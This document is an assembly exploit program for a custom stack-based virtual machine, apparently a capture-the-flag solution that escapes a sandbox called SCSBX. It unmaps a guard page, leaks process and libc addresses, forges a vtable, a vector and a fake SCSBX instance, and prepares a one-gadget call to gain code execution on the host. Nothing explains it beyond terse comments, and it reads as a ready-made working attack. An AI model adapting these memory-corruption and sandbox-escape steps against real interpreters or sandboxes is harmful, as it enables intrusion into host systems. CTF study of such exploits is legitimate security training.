_start:
  ;; unmap guard page
  push 0xffff0000
  sys_unmap

  ;; consolidate with stack
  push 0x0000ffff
  push 0xffff0000
  sys_map

  ;; leak proc address
  push 0xfffffffe
  load64
  push 0xffff0000
  store32
  push 0xffff0004
  store32
  push 0x8
  push 0xffff0000
  sys_write

  ;; fill stack
  push 0x7ffa
  push CmpFill
  jmp
LpFill:
  push 0
  dup
  push 1
  push 1
  xchg
  sub
CmpFill:
  push 0
  dup
  push 0
  push LpFill
  push BrkFill
  jeq
BrkFill:
  ;; get correct vtable address
  push 0x8
  push 0xffffffe8
  sys_read
  ;; inject fake vector
  push 0x10
  push 0xfffff000
  sys_read

  push 0xdeadbeef
  push 0xcafebabe
  push 0xdeadbeef
  push 0xcafebabe
  ;; vtable
  push 5
  dup
  push 5
  dup
  ;; std::vector
  push 0xfffff000               ; begin
  push 0
  push 0xfffff010               ; cur
  push 0
  push 0xfffff100               ; end
  push 0
  ;; pc
PC:
  push PC
  ;; status
  push 0
  ;; code
  push 0x55540000
  push 0
  ;; stack
  push 0xfffe0000
  push 0
  ;; code_size
  push 0x7777
  ;; capacity
  push 0xffffffff
  ;; top
  push 0x8010

  ;; inject fake SCSBX instance
  push 0x54
  push 0xfffffff0
  sys_read

  push 0xc0b3beef               ; marker

  ;; now stack == proc_base
  push 195
  dup
  push 195
  dup
  push 0xffff0004
  store32
  push 0xffff0000
  store32

  ;; leak libc address
  push 0x8
  push 0xffff0000
  sys_write

  ;; inject fake SCSBX instance
  push 0x100
  push 0xfffffff0
  sys_read

  push 0xfeedface               ; marker

  ;; __assert_range_valid
  push 0                        ; create constraints for one gadget
  push 0
  push 0
  push 0
  push 0xffff0000               ; rdx = rbp
  push 0                        ; rsi
  sys_write

  push 0
  sys_exit
